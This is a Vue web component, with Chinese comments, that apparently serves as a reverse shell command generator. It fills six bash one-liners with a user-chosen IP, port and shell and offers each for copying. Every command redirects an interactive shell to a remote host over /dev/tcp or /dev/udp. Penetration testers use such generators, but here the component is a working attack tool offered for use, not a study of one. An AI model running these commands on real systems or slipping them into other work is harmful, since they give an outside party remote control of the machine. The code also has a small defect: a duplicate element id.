<script setup>
import {ref, reactive} from 'vue';

// 适合复杂数组
const web = reactive({
  ip: "8.8.8.8",
  port: "8080",
  shell: "/bin/bash",
  name: "不编码",
})

// 定义 copy 函数：复制指定 id 的 <pre> 内容到剪切板
function copy(id) {
  const preElement = document.getElementById(id);
  if (preElement) {
    const textToCopy = preElement.innerText;  // 获取 <pre> 的文本内容
    navigator.clipboard.writeText(textToCopy)
        .then(() => {
          console.log('复制成功:', textToCopy);  // 可替换为 alert('复制成功！')
        })
        .catch(err => {
          console.error('复制失败:', err);  // 处理错误
        });
  } else {
    console.error('未找到元素:', id);
  }
}

</script>

<template>
  <div class="main_shell">
    <div class="tips input-section"> <!-- 添加 input-section 类以针对输入框优化 -->
      <div class="input-row">
        <label class="label">shell种类:</label>
        <input type="text" id="Source" v-model="web.Source" name="Source">
        <label class="label">编码方式:</label>
        <input type="text" id="name" v-model="web.name" name="name">
      </div>

      <div class="input-row">
        <label class="label">IP:</label>
        <input type="text" id="ip" v-model="web.ip" name="ip">
        <label class="label">Port:</label>
        <input type="text" id="port" v-model="web.port" name="port">
      </div>
    </div>

    <div class="main_bountytips">
      <h3>反弹shell命令快捷生成:</h3>
      <div class="tips">
        <button @click="copy('cmd01')">Copy</button>
        [Linux] Bash -i:
        <pre id="cmd01">{{web.shell}} -i >& /dev/tcp/{{ web.ip }}/{{ web.port }} 0>&1</pre>
      </div>

      <div class="tips">
        <button @click="copy('cmd02')">Copy</button>
        [Linux] Bash 196 TCP:
        <pre id="cmd02">0<&196;exec 196<>/dev/tcp/{{ web.ip }}/{{ web.port }}; {{web.shell}} <&196 >&196 2>&196</pre>
      </div>

      <div class="tips">
        <button @click="copy('cmd03')">Copy</button>
        [Linux] Bash 196 UDP:
        <pre id="cmd03">0<&196;exec 196<>/dev/udp/{{ web.ip }}/{{ web.port }}; {{web.shell}} <&196 >&196 2>&196</pre>
      </div>

      <div class="tips">
        <button @click="copy('cmd04')">Copy</button>
        [Linux] Bash read line:
        <pre id="cmd04">exec 5<>/dev/tcp/{{ web.ip }}/{{ web.port }};cat <&5 | while read line; do $line 2>&5 >&5; done</pre>
      </div>

      <div class="tips">
        <button @click="copy('cmd05')">Copy</button>
        [Linux] Bash 5:
        <pre id="cmd05">{{web.shell}} -i 5<> /dev/tcp/{{ web.ip }}/{{ web.port }} 0<&5 1>&5 2>&5</pre>
      </div>

      <div class="tips">
        <button @click="copy('cmd05')">Copy</button>
        [Linux] Bash udp:
        <pre id="cmd05">{{web.shell}} -i >& /dev/udp/{{ web.ip }}/{{ web.port }} 0>&1</pre>
      </div>

    </div>
  </div>
  <br>

</template>


<style>

button {
  padding: 0 5px;
  margin: 0;
}

textarea {
  position: fixed;
  left: -100%;
}

pre {
  font-family: SFMono-Regular, Consolas, Liberation Mono, Menlo, monospace;
  font-size: 12px;
  background-color: #f6f8fa;
  overflow: auto;
  border: 1px solid #898989;
  padding: 5px;
  margin-top: 5px;
  margin-bottom: 5px;
}

.main_shell {
  max-width: 100%;
  margin: auto;
  background-color: #fff;
  padding: 15px;
  border: 1px solid #898989;
}

.main_shell h3 {
  padding-top: 15px;
  font-size: 16px;
}

.main_bountytips {
  max-width: 100%;
  margin: auto;
  background-color: #fff;
}

.main_bountytips h3 {
  padding-top: 15px;
  font-size: 16px;
  margin-top: 1px;
  margin-bottom: 5px;
}


.tips {
  padding-bottom: 5px;
  padding-top: 5px;
  border-bottom: 1px dashed #999;

}

.tips ul {
  display: block;
  list-style-type: disc;
  margin-block-start: 1em;
  margin-block-end: 1em;
  margin-inline-start: 0px;
  margin-inline-end: 0px;
  padding-inline-start: 15px;
}

.tips ul li {
  display: list-item;
  text-align: -webkit-match-parent;
  list-style-type: square;
}

.tips .tips_title {
  font-size: 14px;
  padding-bottom: 10px;
}

.tips blockquote {
  padding: 0 15px;
  margin: 0;
  color: #666;
  border-left: 4px solid #ddd;
}

input[type=text] {
  border: 1px solid #898989;
  font-size: 15px;
  width: 150px;
}

/* 新增样式：输入框对齐 */
.input-section {
  display: flex;
  flex-direction: column;
  gap: 10px; /* 行间距 */
}

.input-row {
  display: flex;
  align-items: center; /* 垂直居中对齐 */
  gap: 10px; /* 输入组间距 */
}

.label {
  width: 70px; /* 固定标签宽度，确保对齐 */
  text-align: right; /* 右对齐标签文本 */
  margin-right: 5px; /* 标签与输入框间距 */
  background-color: #f6f8fa;
  border: 1px dotted #898989;
}
</style>
